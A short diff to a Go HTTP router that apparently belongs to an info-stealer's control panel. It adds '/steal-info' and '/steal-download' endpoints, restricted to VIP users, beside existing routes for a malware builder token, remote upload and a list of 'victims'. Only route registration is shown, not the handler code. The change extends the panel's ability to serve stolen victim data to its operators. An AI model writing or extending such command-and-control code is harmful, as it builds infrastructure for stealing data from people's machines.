@@ -89,6 +89,8 @@ func NewRouter(db *storage.DB, hub *ws.Hub) http.Handler {
 			r.Get("/builder-token", s.requireVIP(s.handleBuilderToken))
 		}
 		r.Post("/remote-upload", s.requireVIP(s.handleRemoteUpload))
+		r.Get("/steal-info", s.requireVIP(s.handleStealInfo))
+		r.Get("/steal-download", s.requireVIP(s.handleStealDownload))
 		r.Get("/victims", s.requireVIP(s.handleGetVictims))
 		r.Delete("/victims", s.requireVIP(s.handleDeleteVictim))
 		r.Post("/victims", s.requireVIP(s.handleDeleteVictim))
